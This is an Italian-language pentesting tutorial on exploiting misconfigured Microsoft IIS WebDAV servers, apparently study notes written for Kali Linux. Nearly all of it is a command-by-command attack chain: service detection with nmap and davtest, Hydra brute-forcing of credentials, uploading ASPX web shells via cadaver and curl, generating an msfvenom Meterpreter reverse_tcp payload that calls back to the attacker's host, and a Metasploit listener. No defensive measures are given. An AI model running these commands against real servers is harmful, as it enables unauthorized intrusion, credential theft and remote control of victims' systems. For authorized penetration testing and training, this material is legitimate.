# Microsoft IIS WebDAV – Introduzione e Exploit
**WebDAV (Web Distributed Authoring and Versioning)** è un protocollo composto da un set di estensioni HTTP che consentono agli utenti di modificare e gestire in modo collaborativo i file su server web remoti. <br>
WebDAV espone in genere la stessa porta del sito (80/443) e supporta metodi aggiuntivi come `PROPFIND`, `MKCOL`, `PUT`. <br>

Una configurazione debole (per‑mancanza di ACL o controllo sul metodo **PUT**) consente a un attaccante di **caricare ed eseguire file arbitrari**, ottenendo RCE.

---

## 1 – Rilevazione del servizio WebDAV

`nmap -p80,443 --script=http-enum <IP>` ⟶ lo script individua directory WebDAV note. <br>
Dopo aver confermato la presenza di WebDAV, possiamo testare il suo comportamento con: <br>
`davtest -url http://<IP>/webdav` ⟶ sonda metodi (PUT, MKCOL, PROPFIND) e verifica upload se non é protetta da password. <br>
`curl -X OPTIONS http://<IP>/webdav -i` ⟶ elenca i metodi HTTP; se `PUT` è presente, è vulnerabile. <br>

---

## 2 – Brute‑force credenziali (opzionale)

Una volta confermata la vulnerabilità, possiamo tentare di scoprire le credenziali di accesso usando Hydra: <br>
`hydra -L /usr/share/wordlists/common_users.txt -P /usr/share/wordlists/common_passwords.txt -s 80 -f -u <IP> http-get /webdav` <br>

* `-L` / `-P` puntano ai file utenti / password. <br>
* `-s 80` specifica la porta. <br>
* `-f` interrompe alla prima coppia valida. <br>
* `-u` mantiene la stessa connessione. <br>

Se il server usa HTTPS, sostituisci `http-get` con `https-get` e porta 443: <br>

---

## 3 – Verifica upload con **davtest**

dopo aver scoperto le credenziali di accesso, analizziamoi il comportamento usando davtest: <br>
`davtest -auth <user>:<pass> -url http://<IP>/webdav` ⟶ stessa prova ma autenticata. <br>

Se `PUT` va a buon fine, verrà indicato “SUCCESS” per l’estensione caricata.

---

## 4 – Upload di una Web‑Shell con **cadaver**

`cadaver http://<IP>/webdav` ⟶ client WebDAV interattivo. <br>
`put C:\\webshell\\cmd.aspx` ⟶ carica la web‑shell ASPX. <br>

Tutte le web shells disponibili su kali sono visualizzabili al path 
`/usr/share/webshells`

Dopo aver caricato una webshell, ricaricando la pagina del browser dov’era aperta la pagina di WebDAV, possiamo visualizzare la shell caricata quindi, cliccando su di essa per eseguirla, potremmo avere una schermata con la possibilità di inserire dei comandi

---

## 5 – Upload via curl (metodo rapido)
possiamo anche caricare la shell usando curl:

`curl -T shell.aspx http://<user>:<pass>@<IP>/webdav/shell.aspx` ⟶ carica shell ASPX. <br>

---

## 6 – Generazione Payload con **msfvenom**
é possibile generare una shell usando msfvenom: 

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<KaliIP> LPORT=<Port> -f aspx > shell.aspx` <br>

Carica `shell.aspx` via `cadaver` o `curl`; una volta richiamato, avrai la sessione Meterpreter.

---

## 7 – Listener Metasploit

`use multi/handler` ⟶ modulo listener generico. <br>
`set payload windows/meterpreter/reverse_tcp` ⟶ definisce il payload. <br>
`set LHOST <KaliIP>` ⟶ IP della macchina Kali. <br>
`set LPORT <Port>` ⟶ porta configurata nel payload. <br>
`run` ⟶ avvia il listener in attesa della connessione. <br>

e successivamente eseguiamo la shell caricata sul target con `cadaver` o `curl`

Queso processo é totalmente automatizzabile usando il modulo: <br>
`exploit/windows/iis/iis_webdav_upload_asp`

---
